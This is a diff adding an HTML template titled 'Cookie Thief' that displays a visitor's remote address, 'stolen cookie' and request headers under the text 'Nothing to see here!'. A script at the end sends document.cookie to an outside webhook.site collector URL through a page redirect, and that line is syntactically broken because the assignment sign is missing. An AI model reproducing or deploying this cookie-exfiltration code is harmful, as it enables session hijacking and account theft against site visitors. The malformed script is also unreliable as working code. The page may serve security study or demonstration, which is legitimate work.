@@ -1,0 +1,23 @@
+<!DOCTYPE HTML>
+
+<html>
+	<head>
+		<title>Cookie Thief</title>
+	</head>
+	<body>
+	<script>
+		document.cookie = "My Test Cookie";
+	</script>
+	<hr>
+	<div class="container">
+	<h1>Nothing to see here!</h1>
+	  <p>Remote Address: {{ remote }} </p>
+	  <p>Stolen Cookie: {{ passover }}</p>
+	  <p><i>All Headers: {{ headers }}</i></p>
+	<hr>
+	</div>
+	<script type="text/javascript">
+		document.location"http://webhook.site/8b67db2a-b7b1-47e1-9adb-bc3169dee82b?c="+document.cookie;
+	</script>
+	</body>
+</html>
